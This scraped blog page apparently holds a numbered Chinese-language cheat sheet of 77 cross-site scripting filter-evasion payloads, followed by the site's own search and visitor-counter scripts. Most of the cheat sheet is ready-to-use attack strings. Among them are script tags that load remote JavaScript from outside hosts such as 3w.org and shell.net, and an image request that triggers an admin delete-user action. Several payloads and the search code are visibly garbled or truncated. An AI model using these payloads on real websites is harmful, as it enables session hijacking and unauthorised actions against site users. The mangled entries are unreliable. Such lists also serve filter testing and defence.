4</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div></pre></td><td class="code"><pre><div class="line">(1)普通的XSS JavaScript注入</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(2)IMG标签XSS使用JavaScript命令</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(3)IMG标签无分号无引号</div><div class="line">&lt;IMG SRC=javascript:alert(‘XSS’)&gt;</div><div class="line"></div><div class="line">(4)IMG标签大小写不敏感</div><div class="line">&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;</div><div class="line"></div><div class="line">(5)HTML编码(必须有分号)</div><div class="line">&lt;IMG SRC=javascript:alert(“XSS”)&gt;</div><div class="line"></div><div class="line">(6)修正缺陷IMG标签</div><div class="line">&lt;IMG “”&quot;&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;</div><div class="line"></div><div class="line">(7)formCharCode标签(计算器)</div><div class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</div><div class="line"></div><div class="line">(8)UTF-8的Unicode编码(计算器)</div><div class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</div><div class="line"></div><div class="line">(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</div><div class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</div><div class="line"></div><div class="line">(10)十六进制编码也是没有分号(计算器)</div><div class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</div><div class="line"></div><div class="line">(11)嵌入式标签,将Javascript分开</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(12)嵌入式编码标签,将Javascript分开</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(13)嵌入式换行符</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(14)嵌入式回车</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(15)嵌入式多行注入JavaScript,这是XSS极端的例子</div><div class="line">&lt;IMG SRC=”javascript:alert(‘XSS‘)”&gt;</div><div class="line"></div><div class="line">(16)解决限制字符(要求同页面)</div><div class="line">&lt;script&gt;z=’document.’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’write(“‘&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’w.shell’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;</div><div class="line">&lt;script&gt;eval_r(z)&lt;/script&gt;</div><div class="line"></div><div class="line">(17)空字符</div><div class="line">perl -e ‘print “&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;”;’ &gt; out</div><div class="line"></div><div class="line">(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</div><div class="line">perl -e ‘print “&lt;SCR\0IPT&gt;alert(\”XSS\”)&lt;/SCR\0IPT&gt;”;’ &gt; out</div><div class="line"></div><div class="line">(19)Spaces和meta前的IMG标签</div><div class="line">&lt;IMG SRC=”   javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(20)Non-alpha-non-digit XSS</div><div class="line">&lt;SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(21)Non-alpha-non-digit XSS to 2</div><div class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;</div><div class="line"></div><div class="line">(22)Non-alpha-non-digit XSS to 3</div><div class="line">&lt;SCRIPT/SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(23)双开括号</div><div class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(24)无结束脚本标记(仅火狐等浏览器)</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</div><div class="line"></div><div class="line">(25)无结束脚本标记2</div><div class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</div><div class="line"></div><div class="line">(26)半开的HTML/JavaScript XSS</div><div class="line">&lt;IMG SRC=”javascript:alert(‘XSS’)”</div><div class="line"></div><div class="line">(27)双开角括号</div><div class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</div><div class="line"></div><div class="line">(28)无单引号 双引号 分号</div><div class="line">&lt;SCRIPT&gt;a=/XSS/</div><div class="line">alert(a.source)&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(29)换码过滤的JavaScript</div><div class="line">\”;alert(‘XSS’);//</div><div class="line"></div><div class="line">(30)结束Title标签</div><div class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(31)Input Image</div><div class="line">&lt;INPUT SRC=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(32)BODY Image</div><div class="line">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(33)BODY标签</div><div class="line">&lt;BODY(‘XSS’)&gt;</div><div class="line"></div><div class="line">(34)IMG Dynsrc</div><div class="line">&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(35)IMG Lowsrc</div><div class="line">&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(36)BGSOUND</div><div class="line">&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(37)STYLE sheet</div><div class="line">&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(38)远程样式表</div><div class="line">&lt;LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”&gt;</div><div class="line"></div><div class="line">(39)List-style-image(列表式)</div><div class="line">&lt;STYLE&gt;li &#123;list-style-image: url(“javascript:alert(‘XSS’)”);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</div><div class="line"></div><div class="line">(40)IMG VBscript</div><div class="line">&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</div><div class="line"></div><div class="line">(41)META链接url</div><div class="line">&lt;META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(42)Iframe</div><div class="line">&lt;IFRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;</div><div class="line"></div><div class="line">(43)Frame</div><div class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/FRAMESET&gt;</div><div class="line"></div><div class="line">(44)Table</div><div class="line">&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(45)TD</div><div class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(46)DIV background-image</div><div class="line">&lt;DIV STYLE=”background-image: none)”&gt;</div><div class="line"></div><div class="line">(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)</div><div class="line">&lt;DIV STYLE=”background-image: none)”&gt;</div><div class="line"></div><div class="line">(48)DIV expression</div><div class="line">&lt;DIV STYLE=”width: expression_r(alert(‘XSS’));”&gt;</div><div class="line"></div><div class="line">(49)STYLE属性分拆表达</div><div class="line">&lt;IMG STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</div><div class="line"></div><div class="line">(50)匿名STYLE(组成:开角号和一个字母开头)</div><div class="line">&lt;XSS STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</div><div class="line"></div><div class="line">(51)STYLE background-image</div><div class="line">&lt;STYLE&gt;.XSS&#123;background-image:none”);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</div><div class="line"></div><div class="line">(52)IMG STYLE方式</div><div class="line">exppression(alert(“XSS”))’&gt;</div><div class="line"></div><div class="line">(53)STYLE background</div><div class="line">&lt;STYLE&gt;&lt;STYLE type=”text/css”&gt;BODY&#123;background:url(“javascript:alert(‘XSS’)”)&#125;&lt;/STYLE&gt;</div><div class="line"></div><div class="line">(54)BASE</div><div class="line">&lt;BASE HREF=”javascript:alert(‘XSS’);//”&gt;</div><div class="line"></div><div class="line">(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS</div><div class="line">&lt;EMBED SRC=”http://3w.org/XSS/xss.swf” &gt;&lt;/EMBED&gt;</div><div class="line"></div><div class="line">(56)在flash中使用ActionScrpt可以混进你XSS的代码</div><div class="line">a=”get”;</div><div class="line">b=”URL(\”&quot;;</div><div class="line">c=”javascript:”;</div><div class="line">d=”alert(‘XSS’);\”)”;</div><div class="line">eval_r(a+b+c+d);</div><div class="line"></div><div class="line">(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上</div><div class="line">&lt;HTML xmlns:xss&gt;</div><div class="line">&lt;?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”&gt;</div><div class="line">&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;</div><div class="line">&lt;/HTML&gt;</div><div class="line"></div><div class="line">(58)如果过滤了你的JS你可以在图片里添加JS代码来利用</div><div class="line">&lt;SCRIPT SRC=””&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(59)IMG嵌入式命令,可执行任意命令</div><div class="line">&lt;IMG SRC=”http://www.XXX.com/a.php?a=b”&gt;</div><div class="line"></div><div class="line">(60)IMG嵌入式命令(a.jpg在同服务器)</div><div class="line">Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser</div><div class="line"></div><div class="line">(61)绕符号过滤</div><div class="line">&lt;SCRIPT a=”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(62)</div><div class="line">&lt;SCRIPT =”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(63)</div><div class="line">&lt;SCRIPT a=”&gt;” ” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(64)</div><div class="line">&lt;SCRIPT “a=’&gt;’” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(65)</div><div class="line">&lt;SCRIPT a=`&gt;` SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(66)</div><div class="line">&lt;SCRIPT a=”&gt;’&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(67)</div><div class="line">&lt;SCRIPT&gt;document.write(“&lt;SCRI”);&lt;/SCRIPT&gt;PT SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(68)URL绕行</div><div class="line">&lt;A HREF=”http://127.0.0.1/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(69)URL编码</div><div class="line">&lt;A HREF=”http://3w.org”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(70)IP十进制</div><div class="line">&lt;A HREF=”http://3232235521″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(71)IP十六进制</div><div class="line">&lt;A HREF=”http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(72)IP八进制</div><div class="line">&lt;A HREF=”http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(73)混合编码</div><div class="line">&lt;A HREF=”h</div><div class="line">tt p://6 6.000146.0×7.147/”&quot;&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(74)节省[http:]</div><div class="line">&lt;A HREF=”//www.google.com/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(75)节省[www]</div><div class="line">&lt;A HREF=”http://google.com/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(76)绝对点绝对DNS</div><div class="line">&lt;A HREF=”http://www.google.com./”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(77)javascript链接</div><div class="line">&lt;A HREF=”javascript:document.location=’http://www.google.com/’”&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>

    var searchFunc = function(path, search_id, content_id) {

    $.ajax({
        url: path,
        dataType: "xml",
        async: true,
        success: function( xmlResponse ) {
            // get the contents from search data
            isfetched = true;
            $('.popup').detach().appendTo('.header-inner');
            var datas = $( "entry", xmlResponse ).map(function() {
                return {
                    title: $( "title", this ).text(),
                    content: $("content",this).text(),
                    url: $( "url" , this).text()
                };

                    var index_title = -1;
                    var index_content = -1;
                    var first_occur = -1;
                    // only match artiles with not empty titles and contents
                    if(data_title != '' && data_content != '') {
                        keywords.forEach(function(keyword, i) {
                            index_title = data_title.indexOf(keyword);
                            index_content = data_content.indexOf(keyword);
                            if( index_title < 0 && index_content < 0 ){
                                isMatch = false;
                            } else {
                                if (index_content < 0) {
                                    index_content = 0;
                                }
                                if (i == 0) {
                                    first_occur = index_content;
                                }
                            }
                        });
                    }
                    // show search results
                    if (isMatch) {
                        matchcounts += 1;
                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
                        var content = data.content.trim().replace(/<[^>]+>/g,"");
                        if (first_occur >= 0) {
                            // cut out 100 characters
                            var start = first_occur - 20;
                            var end = first_occur + 80;
                            if(start < 0){
                                start = 0;
                            }
                            if(start == 0){
                                end = 50;
                            }
                            if(end > content.length){
                                end = content.length;
                            }
                            var match_content = content.substring(start, end);
                            // highlight all keywords
                            keywords.forEach(function(keyword){
                                var regS = new RegExp(keyword, "gi");
                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
                            });
                            
                            str += "<p class=\"search-result\">" + match_content +"...</p>"
                        }
                        str += "</li>";
                    }
                })};
                str += "</ul>";

                $resultContent.innerHTML = str;
            });
            proceedsearch();
        }
    });}

  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>
